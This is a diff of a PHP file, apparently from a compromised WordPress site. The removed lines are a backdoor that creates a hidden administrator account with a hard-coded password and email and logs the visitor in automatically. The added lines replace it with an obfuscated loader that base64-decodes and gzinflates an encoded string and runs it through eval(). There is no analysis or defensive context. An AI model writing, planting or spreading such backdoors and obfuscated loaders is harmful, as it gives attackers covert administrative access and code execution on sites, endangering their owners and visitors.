@@ -1,43 +1,6 @@
 <?php
-// Pastikan file ini dijalankan di dalam konteks WordPress
-require_once('wp-load.php');
-
-// Informasi pengguna
-$username = 'superradmin'; // Ganti dengan username yang diinginkan
-$password = '(Casper113377$$Haxor)'; // Ganti dengan password yang diinginkan
-$email = 'caspercode@protonmail.com'; // Ganti dengan email yang diinginkan
-
-// Cek apakah username sudah ada
-if (username_exists($username) == null && email_exists($email) == false) {
-    // Buat pengguna baru
-    $user_id = wp_create_user($username, $password, $email);
-
-    if (!is_wp_error($user_id)) {
-        // Set peran sebagai administrator
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
-
-        echo "Pengguna administrator baru berhasil dibuat. Anda akan diarahkan untuk login otomatis.";
-
-        // Login otomatis
-        wp_set_current_user($user_id);
-        wp_set_auth_cookie($user_id);
-        wp_redirect(admin_url()); // Arahkan ke dashboard admin
-        exit;
-    } else {
-        echo "Gagal membuat pengguna: " . $user_id->get_error_message();
-    }
-} else {
-    // Pengguna sudah ada, lakukan login otomatis
-    $user = get_user_by('login', $username);
-
-    if ($user) {
-        wp_set_current_user($user->ID);
-        wp_set_auth_cookie($user->ID);
-        wp_redirect(admin_url()); // Arahkan ke dashboard admin
-        exit;
-    } else {
-        echo "Pengguna tidak ditemukan.";
-    }
-}
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "POE\x2btP\x2bO\x63\x43O/0I2Qq5y1R8783\x630G6vdmK037QF9\x42tUIXlh1P\x62/r7\x418f\x63/d/45Pd\x2buivIPyiMlhxudXYOwIQT5Iey\x43VF8\x42\x6176\x420du6Z9wh\x2bE5DtgtK/3\x2bTp\x42OX6\x63rSr5xjPv1/hW\x62Z9qOnRmNg5YE0Pg9vkK66\x63K\x6394o1L7HzO\x42yF\x2buxMTq8Z1Gg25I\x42FdH1vSwdU3insSQW61ZVZLY4kKhM/VRRwvf0WpoUymSLO20\x6315P\x622EqYVlW\x62emU8t/h251/lEoGd2p\x628j/5O\x42dnsOWgtwy\x2bzGK44\x63u\x61gKn\x41nZz\x432q31xi4oGkQ1xg\x42hRDspFOIldU/\x62UnSifjQOusTZSTzZ\x614e9\x61WjDRd2X02ES\x62ErPw\x41hpNpod1KsgWQRzq\x43\x61OTs\x419SI8Rx\x62qm\x42OMN2mS2Kz\x2bMzpHouXzrvFEumre8UwFyTF\x62/VmDJkKWlnlnmHz\x61Xw\x62dVp\x41GyWGi2M\x2bu\x2bDgOeS\x2bZ\x63\x61YfhdWE\x43IZdRG5gvutQs26\x42ODG6QX\x6250TGrfLSr\x41XTKWMPWptFu38ijh5\x43T99mF\x43p3H\x61N\x2bHYvUzu\x428km2K\x63q/KpU1\x41q\x63en0pnjWOPOu\x42o\x63qJJfPEf8lXexFnf\x2bNPTUvn0JLm1L\x615YSxU25qdiFzGlR8\x42o\x2b5OqJ4GGQ49Z\x41\x63F5OVHmSO1moDx1EYLxkWd8RYURtUnEy7El6ky\x61U7H4RVIHZ\x61PWNi500mnFNkK6ko\x63\x61W\x2bp4RdkGFtUlS\x63Xj\x61YIFt9\x63Mjx\x621vK0Rj7X5\x42J\x41sj5il\x43tEXt\x43E\x63ndyRe3MJd6f7mt\x62\x2b\x2b41/pU17\x41JuVL1mt3/LJptW\x61jkEGOforrE7Zgkm\x43p5kyQFgz0\x41dYIOQsMEFipfQ/\x439\x43\x42Q\x62vWTUV\x62/UKw\x61\x42wJe9no\x412FQ/EKwe\x42wJe9nn\x41GGQ/0Jwi\x42wJe9nm\x41WGQ/kJwm\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
 ?>
